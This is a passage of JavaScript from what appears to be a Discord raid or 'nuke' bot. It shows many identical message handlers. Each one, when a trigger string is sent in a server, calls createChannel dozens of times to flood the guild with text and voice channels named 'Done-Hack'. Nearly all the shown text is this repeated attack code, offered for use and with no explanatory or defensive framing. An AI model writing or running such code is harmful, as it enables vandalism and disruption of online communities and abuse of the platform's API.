  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');


 }

});
client.on('message', message => {
 if (message.content === x_x) {
  if (!message.channel.guild) return;
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
  message.guild.createChannel('Done-Hack', 'voice');
  message.guild.createChannel('Done-Hack', 'text');
